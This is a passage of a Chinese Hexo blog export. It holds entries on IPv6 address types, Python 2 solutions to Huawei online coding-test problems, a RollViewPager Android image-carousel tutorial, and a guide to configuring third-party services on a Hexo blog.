单播地址只能分配给一个节点上的一个接口，即寻址到该单播地址的数据报文最终会被发送到一个唯一的接口。 组播（多播）地址所谓组播，是指一个源节点发送的单个数据报文能被特定的多个目的节点接收到，路由器转发组播数据是根据组播路由协议学习到得拓扑结构进行的，适合于One-to-Many的通信场合。在IPv6网络中，组播地址也由特定的前缀FF::/8来表示。 任播（泛播）地址这是IPv6特有的地址类型，用来标示一组网络接口（通常属于不同的节点）。但与组播地址不同，路由器会将目的地址作为任播地址的数据报文，发给距本路由器最近的一个网络接口。适用于One-to-One-of-Many的通信场合。 有特殊含义的地址（1）未指定位址 ::/128：所有位元皆为零的位址称作未指定位址。这个位址不可指定给某个网路介面，并且只有在主机尚未知道其来源IP时，才会用于软体中。路由器不可转送包含未指定位址的封包。 （2）Link local位址 ::1/128：是一种单播绕回位址。如果一个应用程式将封包送到此位址，IPv6堆叠会转送这些封包绕回到同样的虚拟介面（相当于IPv4中的127.0.0.1）。fe80::/10－ 这些link-local位址指明，这些位址只在区域连线中是合法的，这有点类似于IPv4中的169.254.0.0/16。 （3）Solicited-node多播位址 ff02::1:FFXX:XXXX－XX:XXXX：为相对应的单播或任播位址中的三个最低的位元组 （4）唯一区域位域 fc00::/7：唯一区域位址（ULA，unique local address）只可在一群网站中发送。这定义在RFC 4193中，是用来取代site-local位域。这位址包含一个40位元的伪随机数，以减少当网站合并或封包误传到网路时碰撞的风险。这些位址除了只能用于区域外，还具备全域性的范畴，这点违反了唯一区域位域所取代的site-local位址的定义。 （5）多播位址 ff00::/8：这个前置表明定义在”IP Version 6 Addressing Architecture”（RFC 4291）中的多播位址。其中，有些位址已用于指定特殊协议，如ff0X::101将到达所有区域的NTP伺服器（RFC 2375）。]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(十一)]]></title>
    <url>%2F2016%2F12%2F14%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81%E4%B8%80%2F</url>
    <content type="text"><![CDATA[这次的前5道题异常之简单，可以说基本上谈不上什么算法，最多只能算是熟悉Python的一些基本操作，所以额外加了3道题，当然，简单并不代表就没用，练手感也是很重要的，按照计划继续坚持练习，Keep Moving！ 此篇博客的题目依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(11-15题，17题，20题，22题)。 地址如下：https://www.nowcoder.com/ta/huawei 数字颠倒题目描述输入一个整数，将这个整数以字符串的形式逆序输出程序不考虑负数的情况，若数字含有0，则逆序形式也含有0，如输入为100，则输出为001 输入描述: 输入一个int整数 输出描述: 将这个整数以字符串的形式逆序输出 输入例子: 1516000 输出例子: 0006151 Python实现这个题目和下一题字符串反转其实是一样的，我们既可以采用reversed函数也可以使用切片来进行反转，因此这两道题贴出来的代码是使用的不同的写法，但是其实都是对字符串进行反转。 1234#-*- coding:utf-8 -*-input_str = raw_input()print &apos;&apos;.join(reversed(input_str)) #使用reversed函数进行反转，再将列表转换成字符串格式输出 字符串反转题目描述写出一个程序，接受一个字符串，然后输出该字符串反转后的字符串。 输入描述: 输入N个字符 输出描述: 输出该字符串反转后的字符串 输入例子: abcd 输出例子: dcba Python实现1234# -*- coding: utf-8 -*-s = raw_input()print s[::-1] #使用切片进行反转 句子逆序题目描述将一个英文语句以单词为单位逆序排放。例如“I am a boy”，逆序排放后为“boy a am I”所有单词之间用一个空格隔开，语句中除了英文字母外，不再包含其他字符 接口说明1234567/** * 反转句子 * * @param sentence 原句子 * @return 反转后的句子 */public String reverse(String sentence); 输入描述: 将一个英文语句以单词为单位逆序排放。 输出描述: 得到逆序的句子 输入例子: I am a boy 输出例子: boy a am I Python实现1234string = raw_input()s = string.split() #对字符串按空格进行切分，split函数默认不给参数时默认按空格进行切分s.reverse() #列表进行反转print &apos; &apos;.join(s) #列表转换成字符串进行输出 字串的连接最长路径查找题目描述给定n个字符串，请对n个字符串按照字典序排列。 输入描述: 输入第一行为一个正整数n(1≤n≤1000),下面n行为n个字符串(字符串长度≤100),字符串中只含有大小写字母。 输出描述: 数据输出n行，输出结果为按照字典序排列的字符串。 12345678910111213141516171819202122输入例子:9captocatcardtwotooupboatboot输出例子:boatbootcapcardcattotootwoup Python实现1234567891011121314#-*- coding:utf-8 -*-lst = []n = int(raw_input()) #要输入多少行数据for i in range(n): input_str = raw_input() lst.append(input_str) #将每一行数据添加到列表中lst.sort() #列表排序，sort函数默认按字典序进行排序for i in lst: print i #打印排序结果 求int型正整数在内存中存储时1的个数题目描述输入一个int型的正整数，计算出该int型数据在内存中存储时1的个数。 输入描述: 输入一个整数（int类型） 输出描述: 这个数转换成2进制后，输出1的个数 输入例子: 5 输出例子: 2 Python实现使用bin函数将十进制整数转换成0bxx的二进制形式，用切片截取0b后面的字符串，再将其转换成列表，最后使用count函数来统计1的个数。 12n = int(raw_input())print list(bin(n)[2:]).count(&apos;1&apos;) 坐标移动题目描述开发一个坐标计算工具， A表示向左移动，D表示向右移动，W表示向上移动，S表示向下移动。从（0,0）点开始移动，从输入字符串里面读取一些坐标，并将最终输入结果输出到输出文件里面。 输入： 合法坐标为A(或者D或者W或者S) + 数字（两位以内） 坐标之间以;分隔。 非法坐标点需要进行丢弃。如AA10; A1A; $%$; YAD; 等。 下面是一个简单的例子 如： A10;S20;W10;D30;X;A1A;B10A11;;A10; 处理过程： 起点（0,0） A10 = （-10,0） S20 = (-10,-20) W10 = (-10,-10) D30 = (20,-10) x = 无效 A1A = 无效 B10A11 = 无效 一个空 不影响 A10 = (10,-10) 结果 （10， -10） 输入描述: 一行字符串 输出描述: 最终坐标，以,分隔 输入例子: A10;S20;W10;D30;X;A1A;B10A11;;A10; 输出例子: 10,-10 Python实现123456789101112131415161718192021222324252627282930import systags = [&apos;A&apos;,&apos;D&apos;,&apos;W&apos;,&apos;S&apos;]for input_str in sys.stdin: //处理多个测试数据 lst1 = input_str.split(&apos;;&apos;) //根据;号将字符串切分成列表 lst2 = [] //存储正确坐标指令的列表 for i in lst1: if i == &apos;&apos;: //空的，不影响 continue if i[0] in tags: //去除错误的指令 if i[1:].isdigit(): lst2.append(i) res = [0,0] //结果列表 for i in lst2: //根据规则进行相应的移动 if i[0] == tags[0]: res[0] -= int(i[1:]); elif i[0] == tags[1]: res[0] += int(i[1:]); elif i[0] == tags[2]: res[1] += int(i[1:]); else: res[1] -= int(i[1:]); for i in range(2): res[i] = str(res[i]) print &apos;,&apos;.join(res) //输出结果 密码验证合格程序题目描述密码要求: 1.长度超过8位 2.包括大小写字母.数字.其它符号,以上四种至少三种 3.不能有相同长度超2的子串重复 说明:长度超过2的子串 输入描述: 一组或多组长度超过2的子符串。每组占一行 输出描述: 如果符合要求输出：OK，否则输出NG 输入例子: 021Abc9000 021Abc9Abc1 021ABC9000 021$bc9000 输出例子: OK NG NG OK Python实现123456789101112131415161718192021222324252627282930import sysdef pwdCheck(password): //验证函数 cnt = [0, 0, 0, 0] length = len(password) if length &lt;= 8: //判断长度是否超过8位 return &apos;NG&apos; for k in range(length - 3): //判断是否有相同长度超2的子串重复 if(password[k:k+3] in password[:k] or password[k:k+3] in password[k+3:]): return &apos;NG&apos; for i in password: //判断是否包括大小写字母.数字.其它符号,以上四种至少三种 if i.isalpha(): //字母 if i.isupper(): //大写字母 cnt[0] = 1 else: //小写字母 cnt[1] = 1 elif i.isdigit(): //数字 cnt[2] = 1 else: //其他字符 cnt[3] = 1 count = sum(cnt) if count &gt; 2: //超过3种则OK return &apos;OK&apos; if count &lt; 3: //小于3种则不合格 return &apos;NG&apos; return &apos;OK&apos;for line in sys.stdin.readlines(): //实现多次测试 print pwdCheck(line.strip(&apos;\n&apos;)) //去除输入的回车符号 汽水瓶题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入描述: 输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n（1&lt;=n&lt;=100），表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出描述: 对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出0。 输入例子: 3 10 81 0 输出例子: 1 5 40 Python实现123456789101112131415161718#-*- coding:utf-8 -*-import sysdef getCount(n): //计数函数 cnt = 0 if n == 0: return 0 while n != 1: //直到只有一瓶汽水 cnt = cnt + n/3 //记录喝掉的汽水瓶数 n = n/3 + n%3 //剩下的汽水瓶数 if n == 2: //剩下两个瓶盖的时候可以先喝一瓶再凑足3个还给老板 n = 3 return cntnum = sys.stdin.readlines() //输入多行for i in num: print getCount(int(i))]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android图片轮播框架：RollViewPager]]></title>
    <url>%2F2016%2F12%2F11%2Fandroid%E5%9B%BE%E7%89%87%E8%BD%AE%E6%92%AD%E6%A1%86%E6%9E%B6%EF%BC%9ARollViewPager%2F</url>
    <content type="text"><![CDATA[经常上网逛一逛还是能有不少的收获，以前自己用ViewFlipper控件来实现android的图片轮播效果，做得实在是不怎么样，很多小细节不知道怎么处理，现在好了，在Github上找到一个开源的图片轮播框架，只需要大概30行代码就可以很好地实现图片轮播功能，推荐给大家！ RollViewPager简介自动轮播的Viewpager，支持无限循环。触摸时会暂停播放，直到结束触摸一个延迟周期以后继续播放。其中的指示器可以为点可以为数字还可以自定义，位置也可以变。 Github项目地址：https://github.com/Jude95/RollViewPager 下文大部分均摘抄自该项目的说明文档，可以直接看本博客，也可以到Github上看说明文档，本文旨在宣传该开源框架。 如何使用以android studio为例： 添加依赖在gradle中导入包： 1compile &apos;com.jude:rollviewpager:1.4.5&apos; 添加控件编写布局文件： 1234&lt;com.jude.rollviewpager.RollPagerView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;180dp&quot; app:rollviewpager_play_delay=&quot;3000&quot;/&gt; 还可以为其添加如下属性： app:rollviewpager_play_delay=”3000” 播放间隔时间，单位ms。填0则不播放。默认为0。 app:rollviewpager_hint_gravity=”center” 指示器位置,提供 left , center , right 。默认 center app:rollviewpager_hint_color=”#7c7c7c” 指示器背景颜色.默认黑色 app:rollviewpager_hint_alpha=”80” 指示器背景透明度。0全透明，255不透明。默认0。 app:rollviewpager_hint_paddingLeft=”16dp” 指示器左边距 app:rollviewpager_hint_paddingRight=”16dp” 指示器右边距 app:rollviewpager_hint_paddingTop=”16dp” 指示器上边距 app:rollviewpager_hint_paddingBottom=”16dp” 指示器下边距 一般指定一下间隔时间就好了。 HintView指示器配置提供了HintView是对指示器进行自定义，下面的设置一种方式就好了。 1234mRollViewPager.setHintView(new IconHintView(this,R.drawable.point_focus,R.drawable.point_normal)); //指示器为图片mRollViewPager.setHintView(new ColorPointHintView(this, Color.YELLOW,Color.WHITE)); //指示器为由颜色的点mRollViewPager.setHintView(new TextHintView(this)); //指示器为文本mRollViewPager.setHintView(null);//隐藏指示器 ItemClickListener监听点击事件123456mRollViewPager.setOnItemClickListener(new OnItemClickListener() &#123; @Override public void onItemClick(int position) &#123; Toast.makeText(MainActivity.this,&quot;Item &quot;+position+&quot; clicked&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;); Adapter提供以下三种种方便的PagerAdapter供使用。本ViewPager也可以使用其他任意PagerAdapter。 （1）StaticPagerAdapter 存储页面的Adapter。view添加进去就存储，不会再次 getView ，减少页面创建消耗，但是会消耗更多的内存。一般自动播放的情况这种方案比较好。不然会大量构造View。 概念参照FragmentPagerAdapter。可以用于其他ViewPager。 （2）DynamicPagerAdapter 动态的Adapter，当创建3号view时会销毁1号view(递推)，会时常调用 getView 。增加页面创建消耗，减小内存消耗。 概念参照FragmentStatePagerAdapter。可以用于其他ViewPager。 123456789101112131415161718192021222324//以上2个Adapter用法类似;mRollViewPager.setAdapter(new TestNomalAdapter());private class TestNomalAdapter extends StaticPagerAdapter&#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); return view; &#125; @Override public int getCount() &#123; return imgs.length; &#125;&#125; （3）LoopPagerAdapter 无限循环的Adapter，无限循环上采用的是getCount返回最大的int数的方法，和staticpageradapter页面存储一样。一次创建多次使用。 数据采用StaticPagerAdapter的方案，节省创建View开销。 本Adapter只能用于本RollViewPager 123456789101112131415161718192021222324252627mRollViewPager.setAdapter(new TestLoopAdapter(mRollViewPager));private class TestLoopAdapter extends LoopPagerAdapter&#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; public TestLoopAdapter(RollPagerView viewPager) &#123; super(viewPager); &#125; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); return view; &#125; @Override public int getRealCount() &#123; return imgs.length; &#125;&#125; 播放控制rollViewPager.pause()//暂停rollViewPager.resume()//恢复rollViewPager.isPlaying()//是否正在播放 示例程序布局文件： 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;&gt; &lt;com.jude.rollviewpager.RollPagerView android:id=&quot;@+id/roll_view_pager&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;180dp&quot; app:rollviewpager_play_delay=&quot;3000&quot;/&gt;&lt;/LinearLayout&gt; 存放4张图片到工程res目录下的drawable文件夹下，命名为img1，img2，img3，img4. Java文件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); /**使用RollPagerView实现图片轮播**/ mRollViewPager = (RollPagerView) view.findViewById(R.id.roll_view_pager); //设置播放时间间隔 mRollViewPager.setPlayDelay(2000); //设置透明度 mRollViewPager.setAnimationDurtion(500); //设置适配器 mRollViewPager.setAdapter(new TestNormalAdapter()); //设置指示器（顺序依次） mRollViewPager.setHintView(new ColorPointHintView(view.getContext(), Color.YELLOW, Color.WHITE)); &#125; private class TestNormalAdapter extends StaticPagerAdapter &#123; private int[] imgs = &#123; R.drawable.img1, R.drawable.img2, R.drawable.img3, R.drawable.img4, &#125;; @Override public View getView(ViewGroup container, int position) &#123; ImageView view = new ImageView(container.getContext()); view.setImageResource(imgs[position]); view.setScaleType(ImageView.ScaleType.CENTER_CROP); view.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)); view.setOnClickListener(new View.OnClickListener() // 点击事件 &#123; @Override public void onClick(View v) &#123; Toast.makeText(MainActivity.this, &quot;你点击了第&quot; + (position + 1) + &quot;张图片&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125;); return view; &#125; @Override public int getCount() &#123; return imgs.length; &#125; &#125;&#125; 写到这里，其实还是有话要说。现在连图片轮播都有开源框架了，自己要写的代码真的越来越少，要考虑的问题也越来越少。我们常常说不要重复造轮子，但是越来越觉得自己根本不会造轮子。注重基础，在自己实现过的基础上，再去对比开源框架，如果确实比自己做得好，那你应该认真思考自己写的程序的不足，然后可以采用开源框架进行开发。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,RollViewPager,图片轮播］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（三）]]></title>
    <url>%2F2016%2F12%2F06%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[此篇博客主要介绍了自己的博客站点所使用的一些第三方服务的配置，以及主题的一些优化。当然，每个人的需要都不太相同，大家也可以根据自己的喜好去选择使用第三方服务来让自己的博客站点更完善更强大。 再次强调：在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为全局配置文件；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为主题配置文件。 博客图片存放Markdown编辑器支持插入图片，可以直接给出图片的链接，因此我们可以将图片存放在我们hexo项目的目录下，再填写对应的路径，也可以将其存放在云服务器上，然后给出链接。 在这里，我们介绍使用七牛云来进行图片托管。七牛云是国内领先的企业级云服务商,致力于打造以数据为核心的场景化PaaS服务，图片加载速度还不错，一般也不会出现图片挂掉的情况。 注册账号注册申请一个个人账号，然后激活邮箱完成注册。 官网地址：http://www.qiniu.com/ 存储图片（1）点击左侧菜单的对象存储 （2）点击上端的添加来创建存储空间 （3）填写好基本信息，点击确定创建 （4）来到新创建的存储空间，点击内容管理 （5）在内容管理中可以看到文件列表，点击上传文件 （6）可以设置上传的文件的前缀，以便进行分类管理 （7）点击关闭，回到内容管理页面查看上传的文件，复制图片链接 至此，我们就将我们博客需要的图片存储到了七牛云，然后我们只要将复制的图片链接插入到博客人文章中即可显示图片，感觉显示速度还是蛮快的。 配置第三方服务多说社会化评论（1）多说创建站点 多说官网：http://duoshuo.com/ 登录多说官网，点击主页的我要安装来到创建站点页面填写基本信息： 点击创建后出现：服务异常,请联系客服人员的错误不是因为真的出现异常，而是你填写的用户名或者其他信息不符合他的要求，只是他没有提示你，这是需要注意的地方。比如我遇到的是用户名不能使用‘-’中划线和‘_’下划线，或者多说域名填写格式错误。 （2）创建站点完成后在全局配置文件中新增duoshuo_shortname字段。 值设置成上一步中填写的值（红色方框框出部分的值） 例如： 1duoshuo_shortname: fzyLine （3）实现效果 多说分享多说分享必须与多说评论同时使用 编辑全局配置文件，添加字段 duoshuo_share，值为 true。 12# 多说分享服务duoshuo_share: true 实现效果： 不蒜子统计编辑全局配置文件中的busuanzi_count的配置项。 当enable: true时，代表开启全局开关。若site_uv、site_pv、page_pv的值均为false时，不蒜子仅作记录而不会在页面上显示。 123456789101112131415busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt; #如果使用默认的，会显示图标 page_pv_footer: 实现效果： 可以修改成如下的样子： 当site_uv: true时，代表在页面底部显示站点的UV值。即访客数： 1234# 效果：本站访客数12345人次site_uv: truesite_uv_header: 本站访客数site_uv_footer: 人次 当site_pv: true时，代表在页面底部显示站点的PV值。即总访问量： 1234# 效果：本站总访问量12345次site_pv: truesite_pv_header: 本站总访问量site_pv_footer: 次 当page_pv: true时，代表在文章页面的标题下显示该页面的PV值（阅读数）。1234# 效果：本文总阅读量12345次page_pv: truepage_pv_header: 本文总阅读量page_pv_footer: 次 站内搜索next主题的官方文档提供了几种实现搜索服务的方式，我们就使用配置最简单的Local Search，添加百度/谷歌/本地 自定义站点内容搜索。 （1）安装 hexo-generator-searchdb，在站点目录下执行以下命令： 1$ npm install hexo-generator-searchdb --save （2）编辑全局配置文件，新增以下内容到任意位置： 12345search: path: search.xml field: post format: html limit: 10000 （3）实现效果： 开启打赏功能next主题开启打赏功能很简单，我们只需要在全局配置文件中填入微信和支付宝收款二维码图片地址即可开启该功能。先到微信和支付宝将自己收款二维码图片保存，我们同样可以将其存在七牛云上，然后贴到下面的配置文件里。 123reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！wechatpay: 微信当面付图片的urlalipay: 支付宝当面付图片的url 实现效果： Github pages + Hexo搭建静态博客站点的系列文章到这里就完结了，其实也算是一个很详细的教程了，花了一些时间来整理。之后可能不会再更新，但是，如果之后遇到一些问题或者有更好的推荐，可能还会再写。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(十)]]></title>
    <url>%2F2016%2F12%2F04%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%8D%81%2F</url>
    <content type="text"><![CDATA[继续使用Python进行算法练习解题，此篇博客的5道题依然来自于牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练(6-10题)。 地址如下：https://www.nowcoder.com/ta/huawei 质数因子题目描述功能:输入一个正整数，按照从小到大的顺序输出它的所有质数的因子（如180的质数因子为2 2 3 3 5 ）,最后一个数后面也要有空格 详细描述： 函数接口说明： public String getResult(long ulDataInput) 输入参数： long ulDataInput：输入的正整数 返回值： String 输入描述: 输入一个long型整数 输出描述: 按照从小到大的顺序输出它的所有质数的因子，以空格隔开。最后一个数后面也要有空格。 输入例子: 180 输出例子: 2 2 3 3 5 Python实现如果一个数是质数，那么它的倍数都不是质数。 我们不需要考虑是否是质数因子，因为每次得到的那个因子肯定是质数因子，其他数都可以从这些质数因子相乘得到。比如，i = 4能被整除的不可能出现，因为当i=2时已经被全求出来了。 这个题的思路其实不太好描述，还是看代码吧！ 123456789101112while True: try: n = int(raw_input()) i = 2 while n&gt;1: while(n%i == 0): print i, n = n/i i += 1 except: break python中print输出一行，如果想多次输出的内容不换行，可以在print后面加逗号. 取近似值题目描述写出一个程序，接受一个正浮点数值，输出该数值的近似整数值。如果小数点后数值大于等于5,向上取整；小于5，则向下取整。 输入描述: 输入一个正浮点数值 输出描述: 输出该数值的近似整数值 输入例子: 5.5 输出例子: 6 Python实现将输入的数据转换成float类型，再用round函数进行四舍五入，最后转换成int类型进行输出 123import sysnum = sys.stdin.readline() #读取一行数据print int(round(float(num))) 合并表记录题目描述数据表记录包含表索引和数值，请对表索引相同的记录进行合并，即将相同索引的数值进行求和运算，输出按照key值升序进行输出。 输入描述: 先输入键值对的个数，然后输入成对的index和value值，以空格隔开 输出描述: 输出合并后的键值对（多行） 输入例子: 4 0 1 0 2 1 2 3 4 输出例子: 0 3 1 2 3 4 Python实现123456789101112131415161718#-*- coding:utf-8 -*-n = int(raw_input())dic = &#123;&#125; #构造字典for i in range(n): item = raw_input().split() #获取一行输入 key = int(item[0]) #得到该行的第一个数：键 value = int(item[1]) #得到该行的第二个数：值 if key in dic: #如果字典中已经存在这个键，则将其键值相加 dic[key] += value; else: #否则添加新的键值对 dic[key] = value;lst = dic.keys() #获取字典的所有键lst.sort() #对键进行排序for i in lst: #根据键从小到大输出 print i,dic[i] 提取不重复的整数题目描述输入一个int型整数，按照从右向左的阅读顺序，返回一个不含重复数字的新的整数。 输入描述: 输入一个int型整数 输出描述: 按照从右向左的阅读顺序，返回一个不含重复数字的新的整数 输入例子: 9876673 输出例子: 37689 Python实现12345678#-*- coding:utf-8 -*-input_str = raw_input()res = [] for i in list(reversed(input_str)): #反转字符串，并将其转换从列表 if i not in res: #去除重复的数字 res.append(i)print &quot;&quot;.join(res) #列表转字符串 字符个数统计题目描述编写一个函数，计算字符串中含有的不同字符的个数。字符在ACSII码范围内(0~127)。不在范围内的不作统计。 输入描述: 输入N个字符，字符在ACSII码范围内。 输出描述: 输出范围在(0~127)字符的个数。 输入例子: abc 输出例子: 3 Python实现123456789101112131415161718#-*- coding:utf-8 -*-import sysdef count(input_str): #自定义处理函数 s = [] cnt = 0 for ch in input_str: #去除重复的字符 if ch not in s: s.append(ch) for c in s: #统计个数 if (ord(c) &gt;=0 and ord(c) &lt;= 127): cnt+=1 print cntinput_str = sys.stdin.readline() #根据题目要求要实现多组数据的测试count(input_str) #调用函数处理]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(九)]]></title>
    <url>%2F2016%2F12%2F03%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B9%9D%2F</url>
    <content type="text"><![CDATA[近来，越来越感受到Python的魅力，简洁的书写，相对高效的实现，写起来很舒服。以前只是用python做一些应用，也只是需要什么就去学什么，并没有真正系统地学习这门语言，现在结合书本和教学视频系统地进行学习，然后再通过Python来练习这些算法题，突然发现也是一种不错的学习方式。 下面的题目均来自牛客网（专业IT笔试面试备考平台）在线编程之：华为机试在线训练 地址如下：https://www.nowcoder.com/ta/huawei 字符串最后一个单词的长度题目描述计算字符串最后一个单词的长度，单词以空格隔开。 输入描述: 一行字符串，非空，长度小于5000。 输出描述: 整数N，最后一个单词的长度。 输入例子: hello world 输出例子: 5 Python实现这个题目本身就比较简单，python来实现则更加简单，因为python提供了很多方便快捷地方法，比如此题，split方法可以将我们输入的字符串切分成列表，然后取出列表最后一个元素即最后一个单词，再用len方法得到该单词的长度。列表中，负数索引是从列表右端即尾部开始，-1索引即为最后一个元素。 12mystr = raw_input()print len(mystr.split(&apos; &apos;)[-1]) 计算字符个数题目描述写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。 输入描述: 输入一个有字母和数字以及空格组成的字符串，和一个字符。 输出描述: 输出输入字符串中含有该字符的个数。 输入例子: ABCDEF A 输出例子: 1 Python实现1234input_str = raw_input() #获取字符串tag = raw_input() #获取目标字符lst = list(input_str.lower()) #题目中说明不区分大小写，所以全部转换从小写，然后将字符串转换成列表print lst.count(tag.lower()) #统计字符在列表中出现的次数 明明的随机数题目描述明明想在学校中请一些同学一起做一项问卷调查，为了实验的客观性，他先用计算机生成了N个1到1000之间的随机整数（N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作。 Input Param n 输入随机数的个数 inputArray n个随机整数组成的数组 Return Value OutputArray 输出处理后的随机整数 注：测试用例保证输入参数的正确性，答题者无需验证。测试用例不止一组。 输入描述: 输入多行，先输入随机整数的个数，再输入相应个数的整数 输出描述: 返回多行，处理后的结果 123456789101112131415161718192021222324输入例子:11102040326740208930040015输出例子:10152032406789300400 Python实现12345678910111213141516import syswhile True: #题目要求有多组数据，需要循环 try: #捕获异常 n = int(raw_input()) #确定要输入多少个数据 l = [] for _ in range(0,n): k = sys.stdin.readline() #输入n个数 l.append(int(k)) res = list(set(l)) #集合是不重复的，这样做可以去除list中重复的元素 res.sort() #对去重后的列表进行排序 for i in res: #打印结果 print i except: break 字符串分隔题目描述 连续输入字符串，请按长度为8拆分每个字符串后输出到新的字符串数组； 长度不是8整数倍的字符串请在后面补数字0，空字符串不处理。 输入描述: 连续输入字符串(输入2次,每个字符串长度小于100) 输出描述: 输出到长度为8的新字符串数组 输入例子: abc 123456789 输出例子: abc00000 12345678 90000000 python实现这里采用一种巧妙地办法，因为要以8为间隔输出字符串，所以我们先判断字符串长度是否为0，如果不为0，则在字符串末尾添加7个0，这样就不用考虑后面会缺几个0了，方便后面的输出，输出时我们只要以8为间隔输出，然后不满8个字符就不用输出了，肯定是末尾我们补上的多余的0了。 以下三种写法基本思路一样，关键在于输出的时候可以采用不同的办法进行处理。 （1）写法一 1234567891011121314# -*- coding: utf-8 -*-str1 = raw_input()str2 = raw_input()def splitstr(string): if(len(string) != 0): string += &quot;0000000&quot; while(len(string) &gt;= 8): #字符串长度大于等于8才打印出来 print string[0:8] #使用分片的方法切分字符串 string = string[8:]splitstr(str1)splitstr(str2) （2）写法二 123456789101112a = raw_input()b = raw_input()def substr(line): left = len(line)%8 if left!=0: line += &quot;0&quot; * (8-left) for i in range(len(line)/8): #字符串长度大于等于8才打印出来 print line[i*8 : (i+1)*8] #使用索引加分片的方法切分字符串substr(a)substr(b) （3）写法三 123456789101112131415# -*- coding: utf-8 -*-import restr1 = raw_input()str2 = raw_input()def substr(string): if(len(string) != 0): string += &quot;0000000&quot; mylist = re.findall(r&apos;.&#123;8&#125;&apos;,string) #用正则表达式对字符串进行切分 for substr in mylist: #打印切分好的以8个字符为间隔的字符串 print substrsubstr(str1)substr(str2) 进制转换题目描述写出一个程序，接受一个十六进制的数值字符串，输出该数值的十进制字符串。（多组同时输入 ） 输入描述: 输入一个十六进制的数值字符串。 输出描述: 输出该数值的十进制字符串。 输入例子: 0xA 输出例子: 10 Python实现12345# -*- coding: utf-8 -*-import sysfor line in sys.stdin: print int(line, 16) 其中，for line in sys.stdin实现多行输入 